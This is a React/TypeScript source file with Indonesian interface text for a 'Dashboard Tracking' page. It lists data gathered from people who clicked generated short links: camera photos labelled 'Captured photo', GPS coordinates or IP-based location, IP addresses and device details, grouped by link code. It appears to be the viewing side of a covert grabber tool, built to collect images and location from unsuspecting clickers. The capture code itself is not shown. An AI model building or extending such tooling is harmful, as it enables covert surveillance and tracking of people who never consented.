
import React, { useEffect, useState } from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from '@/components/ui/table';
import { Badge } from '@/components/ui/badge';
import { Button } from '@/components/ui/button';
import { MapPin, Camera, Monitor, RefreshCw, ExternalLink } from 'lucide-react';
import { useToast } from '@/hooks/use-toast';
import supabase from '../utils/database';
import { Tables } from '@/integrations/supabase/types';

type TrackingData = Tables<'tracking_data'>;

const TrackingDashboard = () => {
  const [trackingData, setTrackingData] = useState<TrackingData[]>([]);
  const [isLoading, setIsLoading] = useState(true);
  const { toast } = useToast();

  // Function to extract browser/OS info from user agent
  const parseUserAgent = (userAgent: string) => {
    const ua = userAgent.toLowerCase();
    let browser = 'Unknown';
    let os = 'Unknown';

    // Detect Browser
    if (ua.includes('firefox')) browser = 'Firefox';
    else if (ua.includes('samsungbrowser')) browser = 'Samsung Browser';
    else if (ua.includes('opera') || ua.includes('opr')) browser = 'Opera';
    else if (ua.includes('edge')) browser = 'Edge';
    else if (ua.includes('chrome')) browser = 'Chrome';
    else if (ua.includes('safari')) browser = 'Safari';

    // Detect OS
    if (ua.includes('windows')) os = 'Windows';
    else if (ua.includes('macintosh')) os = 'MacOS';
    else if (ua.includes('linux')) os = 'Linux';
    else if (ua.includes('android')) os = 'Android';
    else if (ua.includes('iphone') || ua.includes('ipad')) os = 'iOS';

    return { browser, os };
  };

  useEffect(() => {
    fetchTrackingData();
  }, []);

  const fetchTrackingData = async () => {
    setIsLoading(true);
    try {
      const { data, error } = await supabase
        .from('tracking_data')
        .select('*')
        .order('created_at', { ascending: false });

      if (error) {
        console.error('Error fetching tracking data:', error);
        toast({
          title: "Error",
          description: "Gagal mengambil data tracking",
          variant: "destructive",
        });
      } else {
        setTrackingData(data || []);
      }
    } catch (error) {
      console.error('Error:', error);
      toast({
        title: "Error",
        description: "Terjadi kesalahan yang tidak terduga",
        variant: "destructive",
      });
    } finally {
      setIsLoading(false);
    }
  };

  const formatDate = (dateString: string) => {
    return new Date(dateString).toLocaleDateString('id-ID', {
      year: 'numeric',
      month: 'short',
      day: 'numeric',
      hour: '2-digit',
      minute: '2-digit',
    });
  };

  const getTypeIcon = (type: string) => {
    switch (type) {
      case 'photo':
        return <Camera className="h-4 w-4" />;
      case 'location':
        return <MapPin className="h-4 w-4" />;
      default:
        return <Monitor className="h-4 w-4" />;
    }
  };

  const getTypeBadge = (type: string) => {
    const variants = {
      photo: 'default',
      location: 'secondary',
      ip_only: 'outline',
      fallback: 'destructive'
    } as const;
    
    return (
      <Badge variant={variants[type as keyof typeof variants] || 'outline'}>
        {getTypeIcon(type)}
        <span className="ml-1 capitalize">{type.replace('_', ' ')}</span>
      </Badge>
    );
  };

  const getLocationString = (data: any) => {
    if (data?.coordinates) {
      return `${data.coordinates.latitude.toFixed(6)}, ${data.coordinates.longitude.toFixed(6)}`;
    }
    if (data?.ipInfo) {
      return `${data.ipInfo.city}, ${data.ipInfo.country}`;
    }
    return 'N/A';
  };

  const groupedData = trackingData.reduce((acc, item) => {
    if (!acc[item.short_code]) {
      acc[item.short_code] = [];
    }
    acc[item.short_code].push(item);
    return acc;
  }, {} as Record<string, TrackingData[]>);

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-50 to-gray-100 p-4">
      <div className="max-w-7xl mx-auto">
        <div className="mb-8 flex justify-between items-center">
          <div>
            <h1 className="text-3xl font-bold text-gray-900 mb-2">Dashboard Tracking</h1>
            <p className="text-gray-600">Monitor semua aktivitas dari short link yang diklik</p>
          </div>
          <Button onClick={fetchTrackingData} disabled={isLoading}>
            <RefreshCw className={`h-4 w-4 mr-2 ${isLoading ? 'animate-spin' : ''}`} />
            Refresh
          </Button>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8">
          {/* Cards tetap sama */}
        </div>

        {Object.keys(groupedData).length === 0 ? (
          <Card>
            <CardContent className="text-center py-8">
              <p className="text-gray-500 mb-4">Belum ada data tracking</p>
              <Button onClick={() => window.location.href = '/generator'}>
                Buat Short Link
              </Button>
            </CardContent>
          </Card>
        ) : (
          <div className="space-y-6">
            {Object.entries(groupedData).map(([shortCode, data]) => (
              <Card key={shortCode}>
                <CardHeader>
                  <CardTitle className="flex items-center gap-2">
                    <Badge variant="outline">{shortCode}</Badge>
                    <span className="text-sm text-gray-500">({data.length} aktivitas)</span>
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="overflow-x-auto">
                    <Table>
                      <TableHeader>
                        <TableRow>
                          <TableHead>Type</TableHead>
                          <TableHead>Foto/Lokasi</TableHead>
                          <TableHead>Device Info</TableHead>
                          <TableHead>Waktu</TableHead>
                          <TableHead>IP Address</TableHead>
                        </TableRow>
                      </TableHeader>
                      <TableBody>
                        {data.map((item) => {
                          const deviceInfo = parseUserAgent(item.user_agent || '');
                          return (
                            <TableRow key={item.id}>
                              <TableCell>
                                {getTypeBadge(item.type)}
                              </TableCell>
                              <TableCell>
                                {item.type === 'photo' ? (
                                  <div className="flex items-center gap-3">
                                    <div className="relative">
                                      <img
                                        src={(item.data as any)?.imageUrl}
                                        alt="Captured photo"
                                        className="w-20 h-20 object-cover rounded-md border cursor-pointer hover:opacity-80 transition-opacity"
                                        onClick={() => window.open((item.data as any)?.imageUrl, '_blank')}
                                      />
                                      <Button
                                        size="sm"
                                        variant="ghost"
                                        className="absolute top-1 right-1 p-1 h-4 w-4 bg-white/60"
                                        onClick={() => window.open((item.data as any)?.imageUrl, '_blank')}
                                      >
                                        <ExternalLink className="h-3 w-3" />
                                      </Button>
                                    </div>
                                    <div className="text-sm text-gray-600">
                                      {(item.data as any)?.deviceInfo?.screenWidth}x{(item.data as any)?.deviceInfo?.screenHeight}
                                    </div>
                                  </div>
                                ) : (
                                  <div className="flex items-center gap-2">
                                    <MapPin className="h-4 w-4 text-muted-foreground" />
                                    <span className="text-sm">
                                      {getLocationString(item.data)}
                                    </span>
                                  </div>
                                )}
                              </TableCell>
                              <TableCell>
                                <div className="text-sm space-y-1">
                                  <div className="flex gap-1">
                                    <span className="font-medium">{deviceInfo.os}</span>
                                    <span>•</span>
                                    <span className="text-blue-600">{deviceInfo.browser}</span>
                                  </div>
                                  <div className="text-xs text-gray-500">
                                    {(item.user_agent || '').substring(0, 50)}...
                                  </div>
                                </div>
                              </TableCell>
                              <TableCell className="text-sm text-gray-500">
                                {formatDate(item.created_at)}
                              </TableCell>
                              <TableCell className="text-sm text-gray-500">
                                {item.ip_address || 'N/A'}
                              </TableCell>
                            </TableRow>
                          );
                        })}
                      </TableBody>
                    </Table>
                  </div>
                </CardContent>
              </Card>
            ))}
          </div>
        )}
      </div>
    </div>
  );
};

export default TrackingDashboard;
